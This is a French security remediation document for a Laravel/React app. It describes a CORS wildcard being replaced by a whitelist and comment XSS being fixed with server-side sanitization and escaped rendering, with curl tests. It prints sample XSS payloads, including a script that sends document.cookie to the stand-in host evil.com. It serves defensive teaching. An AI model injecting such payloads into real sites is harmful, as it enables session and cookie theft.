# Protection contre CORS et XSS (SEC-003)

## Modifications apportées

### 🛡️ Partie 1 : Correction CORS

#### Problème initial
```php
'allowed_origins' => ['*'], // ❌ DANGEREUX : Tous les domaines autorisés
```

**Risques** :
- Sites malveillants peuvent faire des requêtes à l'API depuis le navigateur
- Vol de sessions utilisateur
- Requêtes non autorisées au nom de l'utilisateur
- Exposition des tokens d'authentification

#### Solution implémentée
```php
'allowed_origins' => [
    'http://localhost:3000',      // React Dev Server
    'http://localhost:5173',      // Vite Dev Server
    'http://127.0.0.1:3000',
    'http://127.0.0.1:5173',
    // 'https://votre-domaine-prod.com', // À ajouter en production
],
```

**Protection** :
- ✅ Seules les origines de confiance peuvent accéder à l'API
- ✅ Empêche les attaques CSRF depuis des sites tiers
- ✅ Conforme aux bonnes pratiques de sécurité

---

### 🛡️ Partie 2 : Correction XSS (Cross-Site Scripting)

#### Problème initial

**Frontend** : Utilisation de `dangerouslySetInnerHTML`
```jsx
// ❌ VULNÉRABLE
<div dangerouslySetInnerHTML={{ __html: comment.content }} />
```

**Backend** : Aucune sanitization des commentaires
```php
// ❌ VULNÉRABLE
$comment = Comment::create($validated); // Accepte tout HTML/JS
```

**Attaque possible** :
```html
<img src=x onerror="alert('XSS!'); window.location='https://malicious.com'">
<script>document.cookie='stolen'; fetch('https://evil.com?data='+document.cookie)</script>
```

#### Solution implémentée

**1. Backend : Sanitization stricte (CommentController)**
```php
// ✅ SÉCURISÉ
$validated['content'] = strip_tags($validated['content']);
$validated['content'] = htmlspecialchars($validated['content'], ENT_QUOTES, 'UTF-8');
$validated['content'] = trim($validated['content']);
```

**Protections** :
- `strip_tags()` : Supprime tous les tags HTML/JavaScript
- `htmlspecialchars()` : Échappe les caractères spéciaux (`<`, `>`, `"`, `'`, `&`)
- `trim()` : Supprime les espaces inutiles
- `max:1000` : Limite la taille des commentaires

**2. Frontend : Rendu sécurisé par défaut**
```jsx
// ✅ SÉCURISÉ (React échappe automatiquement)
<div style={{ whiteSpace: 'pre-wrap' }}>
  {comment.content}
</div>
```

**3. Migration de nettoyage**
- Fichier : `2024_12_02_000005_sanitize_existing_comments.php`
- Nettoie tous les commentaires existants en base de données

**4. Headers de sécurité HTTP**
```php
'X-XSS-Protection' => '1; mode=block'
'X-Content-Type-Options' => 'nosniff'
'Content-Security-Policy' => "default-src 'self'; script-src 'self'..."
```

---

## Tests de sécurité

### Test 1 : CORS - Origine non autorisée
```bash
# Depuis un domaine non autorisé
curl -H "Origin: https://evil-site.com" http://localhost:8000/api/articles
# Attendu : Requête bloquée par CORS
```

### Test 2 : CORS - Origine autorisée
```bash
# Depuis localhost:3000
curl -H "Origin: http://localhost:3000" http://localhost:8000/api/articles
# Attendu : Requête acceptée
```

### Test 3 : XSS - Injection de script
```bash
# Créer un commentaire malveillant
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "article_id": 1,
    "user_id": 1,
    "content": "<script>alert(\"XSS\")</script>Commentaire normal"
  }'

# Vérifier que le script a été supprimé
curl http://localhost:8000/api/articles/1/comments
# Attendu : content = "Commentaire normal" (sans le script)
```

### Test 4 : XSS - Injection d'image malveillante
```bash
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "article_id": 1,
    "user_id": 1,
    "content": "<img src=x onerror=\"alert(1)\">Test"
  }'

# Attendu : content = "Test" (balise <img> supprimée)
```

---

## Différence entre les approches

### ❌ Approche vulnérable
```jsx
// Backend : Aucune validation
$comment->content = $request->input('content');

// Frontend : Rendu HTML direct
<div dangerouslySetInnerHTML={{ __html: comment.content }} />
```

### ✅ Approche sécurisée (Defence en profondeur)
```php
// Backend : Sanitization stricte
$content = strip_tags($request->input('content'));
$content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
```

```jsx
// Frontend : Échappement automatique par React
<div>{comment.content}</div>
```

---

## Pourquoi dangerouslySetInnerHTML est problématique ?

### Problèmes
1. **Exécution de code arbitraire** : Tout JavaScript injecté sera exécuté
2. **Contournement des protections React** : React échappe automatiquement le contenu par défaut
3. **Vol de cookies/sessions** : `document.cookie` accessible
4. **Redirection malveillante** : `window.location` modifiable
5. **Injection de formulaires** : Phishing possible

### Alternative sécurisée
- Utiliser le rendu par défaut de React : `{content}`
- React échappe automatiquement les caractères HTML
- Pour du contenu riche (markdown), utiliser des bibliothèques sécurisées comme `react-markdown` ou `DOMPurify`

---

## Risques CORS en production

### Avec `'*'` (tous les domaines)
- 🚨 N'importe quel site peut faire des requêtes à votre API
- 🚨 Vol de données utilisateur depuis des sites malveillants
- 🚨 Actions non autorisées au nom de l'utilisateur
- 🚨 Exposition des tokens d'authentification

### Avec liste blanche
- ✅ Seuls les domaines de confiance peuvent accéder
- ✅ Protection contre CSRF depuis sites tiers
- ✅ Contrôle total sur qui peut utiliser l'API

---

## Où corriger : Backend, Frontend, ou les deux ?

### ✅ Réponse : **LES DEUX** (Defence en profondeur)

#### Backend (priorité 1)
- **TOUJOURS** valider et sanitizer les données
- Ne jamais faire confiance aux données utilisateur
- C'est la dernière ligne de défense

#### Frontend (priorité 2)
- Utiliser les protections natives (échappement React)
- Ne jamais utiliser `dangerouslySetInnerHTML` sauf cas très spécifiques
- Ajoute une couche de protection supplémentaire

#### Principe : "Never trust user input"
> La sécurité ne doit jamais reposer uniquement sur le frontend (contournable)

---

## Conformité

✅ **OWASP Top 10**
- A03:2021 - Injection (XSS)
- A05:2021 - Security Misconfiguration (CORS)
- A07:2021 - Identification and Authentication Failures

✅ **CWE**
- CWE-79 : Cross-site Scripting (XSS)
- CWE-942 : Overly Permissive Cross-domain Whitelist

✅ **Standards**
- PCI DSS : Requirement 6.5.7 (Cross-site scripting)
- RGPD : Protection des données personnelles
- ISO 27001 : Contrôles de sécurité des applications web
